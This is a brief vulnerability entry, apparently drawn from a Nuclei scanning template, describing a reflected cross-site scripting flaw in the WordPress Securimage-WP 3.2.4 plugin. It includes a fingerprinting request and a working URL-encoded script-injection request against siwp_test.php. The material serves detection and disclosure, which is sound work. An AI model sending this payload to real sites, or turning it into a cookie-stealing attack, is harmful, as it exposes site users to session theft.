# Vulnerability: WordPress Securimage-WP 3.2.4 - Cross-Site Scripting
**Classification:** CWE-79
**Source:** Nuclei Template (`wp-securimage-xss.yaml`)

## Description
WordPress Securimage-WP 3.2.4 plugin contains a cross-site scripting vulnerability via siwp_test.php. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /wp-content/plugins/securimage-wp/readme.txt HTTP/1.1
Host: {{Hostname}}

GET {{BaseURL}}/wp-content/plugins/securimage-wp/siwp_test.php/%22/%3E%3Cscript%3Ealert(1);%3C/script%3E?tested=1
```

